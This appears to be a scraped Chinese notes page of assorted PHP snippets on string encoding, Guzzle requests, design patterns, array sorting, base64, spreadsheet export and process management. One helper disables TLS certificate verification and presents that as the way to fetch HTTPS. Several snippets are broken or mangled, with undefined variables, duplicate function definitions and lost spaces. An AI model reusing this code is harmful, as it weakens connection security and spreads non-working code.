执行绘图imagefill($image, 0, 0, $bgColor);imagecopyresampled($image, $card, 0, 0, 0, 0, $width, $height, $width, $height);imagefttext($image, 12, 0, 36, 215, $white, $font, $text);imagesavealpha($image, true);// 输出并销毁Header("Content-type: image/png");imagepng($image);imagedestroy($image); PHP不支持Unicode编码12345678910111213141516//文件编码UTF-8echo strlen("中文"); // 6echo substr("中文",0,1) // 乱码echo substr("中文",0,3) // 中PHP原生字符串函数只能操作单字节字符！就是把一个字节当做一个字符来处理！//文件编码UTF-8echo bin2hex("中文"); // 可以看到，"中文"对应的二进制就是：e4b8ade69687echo strlen("中文"); // 所以按照单字节来统计长度，就是6 echo substr("中文",0,1) // 取0到1个字节，也就是e4，并不对应某个字符的编码，所以乱码echo substr("中文",0,3) // 取0到3个字节，刚好把`中`的编码取出来// 脚本类型为UTF-8echo strlen("中文"); // 6echo mb_strlen("中文","UTF-8"); //2 使用mb_strlen ，并传入编码 utf-8, 就会把二进制E4B8ADE69687当做utf-8的处理能正确处理echo mb_strlen("中文"); //2 如果不传编码UTF-8,则函数会自动确定编码，文档说：如果省略，则使用内部字符编码。所以这里也当做UTF-8来处理。echo mb_strlen("中文","GBK"); //3，如果传入编码GBK，则：e4b8ade69687会被当做gbk来处理，一个gbk字符占2字节，所以为：3http://webkit.cc/post/php-and-unicode.html curl乱码php curl乱码 curl_setopt ($ch, CURLOPT_ENCODING ,’gzip’);是告诉 Curl 使用 Gzip 进行解析。 Header 里 Accept-Encoding:gzip 是告诉对方服务器使用 Gzip 进行传输。 ​​​​ curl_setopt($ch, CURLOPT_ENCODING, ‘’);加了这句话，会在请求时自动加上请求头Accept-Encoding，并且返回内容会自动解压，不会乱码了 PHP 进化史12345678910111213141516171819202122232425262728293031323334匿名类的支持new class($i) &#123; public function __construct($i) &#123; $this-&gt;i = $i; &#125;&#125;// 使用 &lt;=&gt; （飞船符）之后function order_func($a, $b) &#123; return $a &lt;=&gt; $b;&#125;// 分组使用语法:use FooLibrary\Bar\Baz\&#123; ClassA, ClassB, ClassC, ClassD as Fizbo &#125;;echo "\u&#123;202E&#125;Reversed text"; //输出反转文本echo "mañana"; // "ma\u&#123;00F1&#125;ana"echo "mañana"; // "man\u&#123;0303&#125;ana" "n" 结合 ~ 字符 (U+0303)$array = [1, 2, 3];//为 $a，$b 和 $c 按键值从 0 开始的方式分配 $array 数组元素的值[$a, $b, $c] = $array;// 使用 “a”，“b” 和 “c” 键分别为 $a，$b 和 $c 分配 $array 中数组元素的值["a" =&gt; $a, "b" =&gt; $b, "c" =&gt; $c] = $array;try &#123; // 部分代码...&#125; catch (ExceptionType1 | ExceptionType2 $e) &#123; // 处理异常的代码&#125; catch (\Exception $e) &#123; // ...&#125;https://learnku.com/php/t/33829 单例模式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121/** * 单例模式 */class Single&#123; public static $attribute = ''; public static $instance = ''; private function __construct($attribute = '浪子编程走四方') &#123; self::$attribute = $attribute; &#125; public static function getInstance($attribute = '浪子编程走四方1') &#123; if (!(self::$instance instanceof self)) self::$instance = new self($attribute); return self::$instance; &#125;&#125;/** * 工厂模式 */class Factory&#123; public static function createObj() &#123; return Single::getInstance('浪子编程走四方'); &#125;&#125;/** * 注册模式 * 含义:就是将对象放在一个对象池中，使用的时候直接去对象池查找. * 需要如下几个操作: * 1.注册 * 2.存放对象池 * 3.获取 * 4.销毁 */Class Register&#123; // 用一个数组来当做对象池，键当做对象别名，值存储具体对象 public static $objTree = []; // 将对象放在对象池 public static function set($key, $val) &#123; return self::$objTree[$key] = $val; &#125; // 通过对象别名在对象池中获取到对象别名 public static function get($key) &#123; return self::$objTree[$key]; &#125;\ // 通过对象别名将对象从对象池中注销https://learnku.com/articles/34160 public static function _unset($key) &#123; unset(self::$objTree[$key]); &#125;&#125;Register::set('single', Factory::createObj());$single = Register::get('single');print_r($single);echo $single::$attribute; guzzle 绑定 host12345678$client = new Client();$response = $client-&gt;get('http://1.2.3.4',["timeout"=&gt;1,"connect_timeout"=&gt;1,'headers'=&gt;['host'=&gt;'xxx.com.cn']]);$status = $response-&gt;getStatusCode();if ($status == 200)&#123; $data=json_decode((string)$response-&gt;getBody(), true);&#125;return false; 指定顺序插入数组元素12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152在数组第2,4个位置插入一个数组$insert = [ ['index'=&gt; 2, 'data' =&gt; '第2'], ['index'=&gt; 4, 'data' =&gt; '第4'],];$data = [ ['a' =&gt; 'a'], ['b' =&gt; 'b'], ['c' =&gt; 'c'], ['d' =&gt; 'd'], ['e' =&gt; 'e'], ['f' =&gt; 'f'],];$i = 0;foreach ($insert as $value) &#123; if (!$value) &#123; continue; &#125; array_splice($data, $value['index'] - 1 + $i, 0 ,[$value]); $i++;&#125;print_r($data); [ [ "a" =&gt; "a", ], [ "index" =&gt; 2, "data" =&gt; "第2", ], [ "b" =&gt; "b", ], [ "c" =&gt; "c", ], [ "index" =&gt; 4, "data" =&gt; "第4", ], [ "d" =&gt; "d", ], [ "e" =&gt; "e", ], [ "f" =&gt; "f", ], ] guzzle 并行请求接口1234567891011121314151617181920212223242526272829303132333435composer require "guzzlehttp/guzzle: 5.3.1"use GuzzleHttp\Pool;use GuzzleHttp\Message\Response;$requests = [];$url = 'http://xxxx.com';$url2 = "http://xxx2.com";$client = new Client();$request = $client-&gt;createRequest('get', $url, ["timeout"=&gt;1,"connect_timeout"=&gt;1]);$request2 = $client-&gt;createRequest('get', $url2, ["timeout"=&gt;1,"connect_timeout"=&gt;1]);$requests[] = $request;$requests[] = $request2;$results = Pool::batch($client, $requests);if(!$results-&gt;getResult($request) instanceof Response &amp;&amp; !$results-&gt;getResult($request2) instanceof Response)&#123; return [];&#125;if($results-&gt;getFailures())&#123; $data = []; $data2 = [];&#125;else&#123; $data = $results-&gt;getResult($request)-&gt;json(); $data2 = $results-&gt;getResult($request2)-&gt;json();&#125;return [$data,$data2];异步请求try&#123; $client = new Client(); $req = $client-&gt;createRequest('GET', 'http://xxx.com?', ['future' =&gt; true,"timeout"=&gt;1,"connect_timeout"=&gt;1]); $client-&gt;send($req)-&gt;then(function ($response)&#123; //dump($response-&gt;json()); &#125;);&#125; catch (\Exception $e)&#123;&#125; 杀掉过期进程12345678910111213141516171819202122232425262728293031323334353637383940414243444546use Carbon\Carbon;try &#123; $pids = $this-&gt;getPids(["php", "lock"]); foreach ($pids as $pid) &#123; $startTime = $this-&gt;getProcessStartTime($pid); $this-&gt;ifKill($startTime, $pid); &#125; &#125; catch (Exception $e) &#123; &#125; protected function getPids($arr) &#123; $command = "ps aux | grep -v grep "; foreach ($arr as $word) &#123; $command .= "| grep &#123;$word&#125;"; &#125; $command .= " | awk '&#123;print $2&#125;'"; $result = shell_exec($command); $result = trim($result); if (empty($result)) &#123; throw new Exception("Cannot find such process " . implode(",", $arr)); &#125; return explode("\n", $result); &#125; protected function getProcessStartTime($pid) &#123; $command = "ps -p &#123;$pid&#125; -o lstart"; $result = shell_exec($command); $result = trim(str_replace("STARTED", "", $result)); if (empty($result)) &#123; throw new Exception("Cannot get process start time, process id is &#123;$pid&#125;"); &#125; $ctime = Carbon::createFromFormat("D M j H:i:s Y", $result); return $ctime; &#125; protected function ifKill(Carbon $ctime, $pid) &#123; if ($ctime-&gt;lt(Carbon::now()-&gt;addHours(-1))) &#123; $cmd = file_get_contents("/proc/&#123;$pid&#125;/cmdline"); shell_exec("kill -9 &#123;$pid&#125;"); &#125; &#125; 根据name和pcode合并职位123456789101112131415161718192021$temp = []; foreach ($arr as $v) &#123; if (isset($temp[$v['Name'].'_'.$v['Pcode']])) &#123; $temp[$v['Name'].'_'.$v['Pcode']]['Duty'] .= ' '.$v['Duty']; &#125; else &#123; $temp[$v['Name'].'_'.$v['Pcode']] = $v; &#125; &#125; //职位排序 $manager = ['董事长', '董事会主席', '总裁', '总经理']; $res = []; foreach ($manager as $value) &#123; foreach ($temp as $k=&gt;$v) &#123; $t = explode(' ', $v['Duty']); if (in_array($value, $t)) &#123; $res[$k] = $v; &#125; &#125; &#125; //dump($res,$res+array_diff_key($temp,$res),$res+$temp); return $res ? $res + $temp : $temp; unicode encode12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849function unicode_encode($name)&#123; $name = iconv('UTF-8', 'UCS-2', $name); $len = strlen($name); $str = ''; for ($i = 0; $i &lt; $len - 1; $i = $i + 2) &#123; $c = $name[$i]; $c2 = $name[$i + 1]; if (ord($c) &gt; 0) &#123; //两个字节的文字 $str .= '\u'.base_convert(ord($c), 10, 16).str_pad(base_convert(ord($c2), 10, 16), 2, 0, STR_PAD_LEFT); &#125; else &#123; $str .= $c2; &#125; &#125; return $str;&#125;//将UNICODE编码后的内容进行解码function unicode_decode($name)&#123; //转换编码，将Unicode编码转换成可以浏览的utf-8编码 $pattern = '/([\w]+)|(\\\u([\w]&#123;4&#125;))/i'; preg_match_all($pattern, $name, $matches); if (!empty($matches)) &#123; $name = ''; for ($j = 0; $j &lt; count($matches[0]); $j++) &#123; $str = $matches[0][$j]; if (strpos($str, '\\u') === 0) &#123; $code = base_convert(substr($str, 2, 2), 16, 10); $code2 = base_convert(substr($str, 4), 16, 10); $c = chr($code).chr($code2); $c = iconv('UCS-2', 'UTF-8', $c); $name .= $c; &#125; else &#123; $name .= $str; &#125; &#125; &#125; return $name;&#125; 二维数组排序123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200//对存储数字的二维数组，按照每个一维数组数字之和的平均值重新排序$arr = array( array(1,18,3,6,2147483648), array(4,16,2,10,1), array(11,2,3,5,9), array(3,8,12,4,8));// 方法一function vhall_sort($arr)&#123; $tmp = $new = array(); $len = count($arr); if ($len == 0 || !is_array($arr)) &#123; return false; &#125; foreach ($arr as $k=&gt;$v) &#123; $num = floatval(array_sum($v)); $tmp[$k] = $num / $len; &#125; arsort($tmp);//倒序排列 foreach ($tmp as $k=&gt;$v)&#123; $new[$k] = $arr[$k];//保持key &#125; return $new;&#125;echo '&lt;pre&gt;';print_r($arr);print_r(vhall_sort($arr));// 方法二 require php5.3+ uasort($arr, function($v1, $v2)&#123; return (array_sum($v1)/count($v1) &gt; array_sum($v2)/count($v2)) ? -1 : 1; &#125;);print_r($arr);//二维数组去掉重复值function array_unique_fb($array2D)&#123; foreach ($array2D as $v)&#123; $v=join(',',$v); //降维,也可以用implode,将一维数组转换为用逗号连接的字符串 $temp[]=$v; &#125; $temp=array_unique($temp); //去掉重复的字符串,也就是重复的一维数组 foreach ($temp as $k =&gt; $v)&#123; $temp[$k]=explode(',',$v); //再将拆开的数组重新组装 &#125; return $temp;&#125;//二维数组去掉重复值,并保留键值function array_unique_fb($array2D)&#123; foreach ($array2D as $k=&gt;$v)&#123; $v=join(',',$v); //降维,也可以用implode,将一维数组转换为用逗号连接的字符串 $temp[$k]=$v; &#125; $temp=array_unique($temp); //去掉重复的字符串,也就是重复的一维数组 foreach ($temp as $k =&gt; $v)&#123; $array=explode(',',$v); //再将拆开的数组重新组装 //下面的索引根据自己的情况进行修改即可 $temp2[$k]['id'] =$array[0]; $temp2[$k]['title'] =$array[1]; $temp2[$k]['keywords'] =$array[2]; $temp2[$k]['content'] =$array[3]; &#125; return $temp2;&#125;/**二维数组按指定的键值排序*/function array_sort($array,$keys,$type='asc')&#123; if(!isset($array) || !is_array($array) || empty($array))&#123; return ''; &#125; if(!isset($keys) || trim($keys)=='')&#123; return ''; &#125; if(!isset($type) || $type=='' || !in_array(strtolower($type),array('asc','desc')))&#123; return ''; &#125; $keysvalue=array(); foreach($array as $key=&gt;$val)&#123; $val[$keys] = str_replace('-','',$val[$keys]); $val[$keys] = str_replace(' ','',$val[$keys]); $val[$keys] = str_replace(':','',$val[$keys]); $keysvalue[] =$val[$keys]; &#125; asort($keysvalue); //key值排序 reset($keysvalue); //指针重新指向数组第一个 foreach($keysvalue as $key=&gt;$vals) &#123; $keysort[] = $key; &#125; $keysvalue = array(); $count=count($keysort); if(strtolower($type) != 'asc')&#123; for($i=$count-1; $i&gt;=0; $i--) &#123; $keysvalue[] = $array[$keysort[$i]]; &#125; &#125;else&#123; for($i=0; $i&lt;$count; $i++)&#123; $keysvalue[] = $array[$keysort[$i]]; &#125; &#125; return $keysvalue;&#125;$array=array( 0=&gt;array('id'=&gt;8,'username'=&gt;'phpernote'), 1=&gt;array('id'=&gt;9,'username'=&gt;'com'), 2=&gt;array('id'=&gt;5,'username'=&gt;'www'));array_sort($array,'id','asc');$trans = array ("a" =&gt; 1, "b" =&gt; 1, "c" =&gt; 2);$trans = array_flip (array_flip($trans));print_r($trans);$arr = array( array('id' =&gt; 1,'name' =&gt; 'aaa'), array('id' =&gt; 2,'name' =&gt; 'bbb'), array('id' =&gt; 3,'name' =&gt; 'ccc'), array('id' =&gt; 4,'name' =&gt; 'ddd'), array('id' =&gt; 5,'name' =&gt; 'ccc'), array('id' =&gt; 6,'name' =&gt; 'aaa'), array('id' =&gt; 7,'name' =&gt; 'bbb'), ); function assoc_unique(&amp;$arr, $key) &#123; $rAr=array(); for($i=0;$i&lt;count($arr);$i++) &#123; if(!isset($rAr[$arr[$i][$key]])) &#123; $rAr[$arr[$i][$key]]=$arr[$i]; &#125; &#125; $arr=array_values($rAr); &#125; assoc_unique($arr,'name'); print_r($arr); function array_sort($arr,$keys,$type='asc')&#123; $keysvalue= $new_array= array(); foreach($arras$k=&gt;$v)&#123; $keysvalue[$k] = $v[$keys]; &#125; if($type== 'asc')&#123; asort($keysvalue); &#125;else&#123; arsort($keysvalue); &#125; reset($keysvalue); foreach($keysvalueas$k=&gt;$v)&#123; $new_array[$k] = $arr[$k]; &#125; return$new_array; &#125; $newArray= array_sort($array,'price'); function hasort($arr) &#123; $a = $b = array(); foreach($arr as $v =&gt; $k) $a[$k][] = $v; ksort($a); print_r($a); foreach($a as $v =&gt; $i) foreach($i as $k) $b[$k] = $v; return $b;&#125;$a = array('a' =&gt; 10, 'z' =&gt; 10, 'c' =&gt; 10, 'b' =&gt; 11, 'd' =&gt; 10);$a = hasort($a);print_r($a);$a = array('a' =&gt; 10, 'z' =&gt; 10, 'c' =&gt; 10, 'b' =&gt; 11, 'd' =&gt; 10);asort($a, SORT_NUMERIC);/** * @param array $weight 权重 例如array('a'=&gt;10,'b'=&gt;20,'c'=&gt;50) * @return string key 键名 */ function roll($weight = array()) &#123; $roll = rand ( 1, array_sum ( $weight ) ); $_tmpW = 0; $rollnum = 0; foreach ( $weight as $k =&gt; $v ) &#123; $min = $_tmpW; $_tmpW += $v; $max = $_tmpW; if ($roll &gt; $min &amp;&amp; $roll &lt;= $max) &#123; $rollnum = $k; break; &#125; &#125; return $rollnum; &#125; $row=roll(array('a'=&gt;10,'b'=&gt;20,'c'=&gt;50)); echo $row; function utf8_array_asort(&amp;$array) &#123; if(!isset($array) || !is_array($array)) &#123; return false; &#125; foreach($array as $k=&gt;$v) &#123; $array[$k] = iconv('UTF-8', 'GBK//IGNORE',$v); &#125; asort($array); foreach($array as $k=&gt;$v) &#123; $array[$k] = iconv('GBK', 'UTF-8//IGNORE', $v); &#125; return true;&#125;$abc = array('a'=&gt;'猜', 'b'=&gt;'我','c'=&gt;'哦','d'=&gt;'棍','e'=&gt;'f','f'=&gt;'爸','z'=&gt;'州');utf8_array_asort($abc);print_r($abc); 报错12345PHP 里这样不会报错：&lt;?php var_dump(NoFound::class); ?&gt;，不注意的话可能会掉坑。 ​​​​还有 http://xxxpreg_match_all('@\p&#123;Han&#125;@u','微博',$m);这也能匹配汉字 并发场景下的重复插入123456789101112$lock = Cache::lock('key', 60);abort_if(!$lock-&gt;get(), 422, '操作过于频繁，请稍后再试！'); $lock-&gt;release();一个用户只能一条吗？用 redis 集合，把用户 id 扔集合里，返回已存在的，就证明已插过了。扔成功的，就是没插入过的。$lock-&gt;block(3,function()&#123; // todo // 在这闭包下写业务逻辑，并且不用手动释放锁，框架会为你自动释放，感觉方便些&#125;);https://learnku.com/laravel/t/34295 小数点 00123456789101112131415161718192021222324$num = [ "a" =&gt; 20.00, "b" =&gt; 39.78,];echo json_encode($num);// &#123;"a":20,"b":39.78&#125;echo 66.00;// 66$num = sprintf("%1\$.2f", 66.00);var_dump($num);// string(4) "66.00"或者$num = number_format(66.00,2,'.','');var_dump($num);// string(5) "66.00"$output = array('x' =&gt; 'y', 'price' =&gt; '30.00');$json = json_encode($output);$json = str_replace('"price":"'.$output['price'].'"', '"price":'.$output['price'].'', $json);print $json;// &#123;"x":"y","price":30.00&#125;https://laravelcode.cn/posts/104/a-brief-talk-on-the-return-value-of-the-decimal-point-00-of-the-output-functions-of-various-languages 反射之动态代理1234567891011121314151617181920212223242526272829基于动态代理，可以有更多的想象空间，如实现拦截器，属性方法增加，裁剪等等class Mysql&#123; function connect($db)&#123; echo "connecting database $&#123;db[0]&#125;\r\n"; &#125;&#125;class SqlProxy&#123; private $target; function __construct($tar)&#123; $this-&gt;target[] = new $tar(); &#125; function __call($name, $args)&#123; if($method = $r-&gt;getMethod($name))&#123; if($method-&gt;isPublic() &amp;&amp; !$method-&gt;isAbstract())&#123; echo "method before record \r\n"; $method-&gt;invoke($obj,$args); echo "method after record\r\n"; &#125; &#125; &#125; &#125; &#125; $obj = new SqlProxy('Mysql'); $obj-&gt;connect('member'); https://learnku.com/articles/34288反射可以探知类的内部结构 可以用它做 hook 实现插件功能，或者做动态代理 PhpSpreadsheet 导出图片到 Excel123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120 public function export($data) &#123; $spreadsheet = new Spreadsheet(); $sheet = $spreadsheet-&gt;getActiveSheet(); //设置sheet的名字 两种方法 $sheet-&gt;setTitle('phpspreadsheet——demo'); $spreadsheet-&gt;getActiveSheet()-&gt;setTitle('Hello'); //设置第一行小标题 $k = 1; $sheet-&gt;setCellValue('A' . $k, '问题'); $sheet-&gt;setCellValue('B' . $k, '选项'); $sheet-&gt;setCellValue('C' . $k, '答案'); $sheet-&gt;setCellValue('D' . $k, '图片'); // 设置个表格宽度 $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension('A')-&gt;setWidth(16); $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension('B')-&gt;setWidth(80); $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension('C')-&gt;setWidth(15); $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension('D')-&gt;setWidth(20); // 垂直居中 $spreadsheet-&gt;getActiveSheet()-&gt;getStyle('A')-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER); $spreadsheet-&gt;getActiveSheet()-&gt;getStyle('B')-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER); $spreadsheet-&gt;getActiveSheet()-&gt;getStyle('C')-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER); $spreadsheet-&gt;getActiveSheet()-&gt;getStyle('D')-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER); $info = $data; // 设置A单元格的宽度 同理设置每个 $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension('A')-&gt;setWidth(20); // 设置第三行的高度 $spreadsheet-&gt;getActiveSheet()-&gt;getRowDimension('3')-&gt;setRowHeight(50); // A1水平居中 $styleArray = [ 'alignment' =&gt; [ 'horizontal' =&gt; \PhpOffice\PhpSpreadsheet\Style\Alignment::HORIZONTAL_CENTER, ], ]; $sheet-&gt;getStyle('A1')-&gt;applyFromArray($styleArray); // 将A3到D4合并成一个单元格 $spreadsheet-&gt;getActiveSheet()-&gt;mergeCells('A3:D4'); // 拆分合并单元格 $spreadsheet-&gt;getActiveSheet()-&gt;unmergeCells('A3:D4'); // 将A2到D8表格边框 改变为红色 $styleArray = [ 'borders' =&gt; [ 'outline' =&gt; [ 'borderStyle' =&gt; \PhpOffice\PhpSpreadsheet\Style\Border::BORDER_THICK, 'color' =&gt; ['argb' =&gt; 'FFFF0000'], ], ], ]; // $sheet-&gt;getStyle('A2:E8')-&gt;applyFromArray($styleArray); // 设置超链接 // $sheet-&gt;setCellValue('D6', 'www.baidu.com'); // $spreadsheet-&gt;getActiveSheet()-&gt;setCellValue('E6', 'www.baidu.com'); // 循环赋值 $k = 2; foreach ($info as $key =&gt; $value) &#123; $sheet-&gt;setCellValue('A' . $k, $value['question']); $sheet-&gt;setCellValue('B' . $k, $value['question_options']); $sheet-&gt;setCellValue('C' . $k, $value['answer']); $img = self::curlGet($value['img']); $dir = public_path('/temp/image/'); $file_info = pathinfo($value['img']); if (!empty($file_info['basename'])) &#123; //过滤非文件类型 $basename = $file_info['basename']; is_dir($dir) OR mkdir($dir, 0777, true); //进行检测文件是否存在 file_put_contents($dir . $basename, $img); $drawing[$k] = new Drawing(); $drawing[$k]-&gt;setName('Logo'); $drawing[$k]-&gt;setDescription('Logo'); $drawing[$k]-&gt;setPath($dir . $basename); $drawing[$k]-&gt;setWidth(80); $drawing[$k]-&gt;setHeight(80); $drawing[$k]-&gt;setCoordinates('D'.$k); $drawing[$k]-&gt;setOffsetX(12); $drawing[$k]-&gt;setOffsetY(12); $drawing[$k]-&gt;setWorksheet($spreadsheet-&gt;getActiveSheet()); &#125; else &#123; $sheet-&gt;setCellValue('D' . $k, ''); &#125; $sheet-&gt;getRowDimension($k)-&gt;setRowHeight(80); $k++; &#125; $file_name = date('Y-m-d', time()) . rand(1000, 9999); // 第一种保存方式 /*$writer = new Xlsx($spreadsheet); //保存的路径可自行设置 $file_name = '../'.$file_name . ".xlsx"; $writer-&gt;save($file_name);*/ // 第二种直接页面上显示下载 $file_name = $file_name . ".xls"; header('Content-Type: application/vnd.ms-excel'); header('Content-Disposition: attachment;filename="' . $file_name . '"'); header('Cache-Control: max-age=0'); $writer = IOFactory::createWriter($spreadsheet, 'Xls'); // 注意createWriter($spreadsheet, 'Xls') 第二个参数首字母必须大写 $writer-&gt;save('php://output'); &#125; public function getClient()&#123; $client = new Client(); return $client; &#125; public static function curlGet($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // 这个是重点 请求https。 $data = curl_exec($ch); curl_close($ch); return $data; &#125; https://learnku.com/articles/26965在其他地方调用 export 方法，传入 $data 数组，数组中有四个字段：question,question_options,answer,img ，其中 img 就是图片的远程地址，剩下的再看一下代码 PHP 多进程开发12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455include __DIR__ . '/vendor/autoload.php';//引入自动加载类use Goutte\Client;//使用第三方采集库$client = new Client();$links = [ 'http://www.nipic.com/topic/show_27192_1.html', 'http://www.nipic.com/topic/show_27054_1.html', 'http://www.nipic.com/topic/show_27085_1.html',];//要爬的三个分类下的图片$pids = [];//定义一个子进程的数组foreach ($links as $url) &#123; $pid = pcntl_fork();//fork 一个子进程 switch ($pid) &#123; case -1: die("Fork failed\n"); case 0: $id = posix_getpid();//得到子进程id $pids[$id] = $id;//存入到子进程数组id 中 $data = []; $crawler = $client-&gt;request('GET', $url); $crawler-&gt;filter('.search-works-thumb')-&gt;each(function($node) use ($client, $id, &amp;$data) &#123; $url = $node-&gt;link()-&gt;getUri(); $crawler = $client-&gt;request('GET', $url); $crawler-&gt;filter('#J_worksImg')-&gt;each(function($node) use ($id, &amp;$data) &#123; $src = $node-&gt;image()-&gt;getUri(); $data[$id][] = $src;//存入消息队列 或者redis 都可以 //echo $src . PHP_EOL; &#125;); &#125;); print_r($data); exit;//结束子进程 break; default: sleep(2); break; &#125;&#125;while ( count($pids) ) &#123; if (($id = pcntl_wait($status, WUNTRACED)) &gt; 0) &#123;//主进程 阻塞等待子进程完成任务 unset($pids[$id]); &#125;&#125;https://learnku.com/articles/26756 larvel excel123456789101112131415161718public function drawings()&#123; //这里的数据自己组装 $draw_arr = [1 =&gt;'detail1.jpg', 2 =&gt; 'detail2.jpg']; $result = []; foreach ($draw_arr as $k =&gt; $v) &#123; $&#123;'drawing'.$k&#125; = new Drawing();//变量还能这样用 $&#123;'drawing'.$k&#125;-&gt;setName('Other image'); $&#123;'drawing'.$k&#125;-&gt;setDescription('This is a second image'); //图片路径 $&#123;'drawing'.$k&#125;-&gt;setPath(public_path($v)); $&#123;'drawing'.$k&#125;-&gt;setHeight(50); //设置图片列 $&#123;'drawing'.$k&#125;-&gt;setCoordinates('U'.$k); $result[] = $&#123;'drawing'.$k&#125;; &#125; return $result;&#125;https://learnku.com/articles/32391 权重随机算法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495class WeightedRoundRobin&#123; private static $_weightArray = array(); private static $_i = -1;//代表上一次选择的服务器 private static $_gcd;//表示集合S中所有服务器权值的最大公约数 private static $_cw = 0;//当前调度的权值 private static $_max; private static $_n;//agent个数 public function init() &#123; &#125; public function initParam(array $weightArray) &#123; self::$_weightArray = $weightArray; self::$_gcd = self::getGcd(self::$_weightArray); self::$_max = self::getMaxWeight(self::$_weightArray); self::$_n = count($weightArray); &#125; private static function getGcd(array $weightArray) &#123; $temp = array_shift($weightArray); $min = $temp['weight']; $status = false; foreach ($weightArray as $val) &#123; $min = min($val['weight'],$min); &#125; if($min == 1)&#123; return 1; &#125;else&#123; for ($i = $min; $i&gt;1; $i--) &#123; foreach ($weightArray as $val) &#123; if (is_int($val['weight']/$i)) &#123; $status = true; &#125;else&#123; $status = false; break; &#125; &#125; if ($status) &#123; return $i; &#125;else &#123; return 1; &#125; &#125; &#125; &#125; private static function getMaxWeight(array $weightArray) &#123; if(empty($weightArray))&#123; return false; &#125; $temp = array_shift($weightArray); $max = $temp['weight']; foreach ($weightArray as $val) &#123; $max = max($val['weight'],$max); &#125; return $max; &#125; public function getWeight() &#123; while (true)&#123; self::$_i = ((int)self::$_i+1) % (int)self::$_n; if (self::$_i == 0) &#123; self::$_cw = (int)self::$_cw - (int)self::$_gcd; if (self::$_cw &lt;= 0) &#123; self::$_cw = (int)self::$_max; if (self::$_cw == 0) &#123; return null; &#125; &#125; &#125; if ((int)(self::$_weightArray[self::$_i]['weight']) &gt;= self::$_cw) &#123; return self::$_weightArray[self::$_i]['id']; &#125; &#125; &#125;&#125;https://learnku.com/articles/34449 base64原理123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657数据先做一个 Base64 编码，统统变成可见字符，降低错误率。基于 A-Z、a-z、0-9 以及 '+' 和 '/' 共 64 个字符的编码方式，因为 2 的 6 次方等于 64，所以说只需要 6 个比特即可表示一个 base64 的字符。 编码表：'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' 核心原理是将二进制数据进行分组，以 6 位一组进行分组，并在每组前面都填两个高位 0，然后将 8 bit 的字节转换成十进制，对照 BASE64 编码表 （上表），得到对应编码后的字符。以对6666P进行base64编码的步骤说明每个字符转化为8bit：6-----&gt;001101106-----&gt;001101106-----&gt;001101106-----&gt;00110110P-----&gt;01010000补位-----&gt;00000000整体拼接结果：001101100011011000110110001101100101000000000000以6bit一组进行分割：001101 100011 011000 110110 001101 100101 000000 000000转化为base64编码脚标：13 35 24 54 13 37 0 0获取对应的base64编码：N j Y 2 N l A A得到结果：string(8) "NjY2NlA="$a = "6666P";$decbinStr= '';//计算补位$end = (3 - strlen($a)%3)%3;for($i=0;$i&lt;strlen($a);$i++)&#123; //每个字符转化为8bit $decbin = str_pad(decbin(ord($a[$i])),8,"0",STR_PAD_LEFT); $decbinStr .= $decbin ;&#125;//增加补位$decbinStr = $decbinStr. str_pad("",$end*8,"0");//以6bit一组进行分割$arr = str_split($decbinStr,6);//转化成对应的base64编码$result = implode("", array_map("getBase64Str",$arr));//末尾补位的数据处理for($j=0;$j&lt;$end;$j++)&#123; if($result[strlen($result)-1-$j] == 'A')&#123; $result[strlen($result)-1-$j] = "="; &#125;&#125;//验证下跟自带的base64_encode结果是否一致var_dump($result);var_dump(base64_encode($a));exit();function getBase64Str($sixStr)&#123; $number = bindec($sixStr); $baseHash = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; return $baseHash[$number];&#125;https://learnku.com/articles/34439 PHP 内存溢出123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112class ExportService&#123; public static $outPutFile = ''; /** * 导出文件 * @param string $fileName * @param $data * @param array $formFields * @return mixed */ public static function exportData($fileName = '', $data, $formFields = []) &#123; $fileArr = []; $tmpPath = \Yii::$app-&gt;params['excelSavePath']; foreach (array_chunk($data, 10000) as $key =&gt; $value) &#123; self::$outPutFile = ''; $subject = !empty($fileName) ? $fileName : 'data_'; $subject .= date('YmdHis'); if (empty($value) || empty($formFields)) &#123; continue; &#125; self::$outPutFile = $tmpPath . $subject . $key . '.csv'; if (!file_exists(self::$outPutFile)) &#123; touch(self::$outPutFile); &#125; $index = array_keys($formFields); $header = array_values($formFields); self::outPut($header); foreach ($value as $k =&gt; $v) &#123; $tmpData = []; 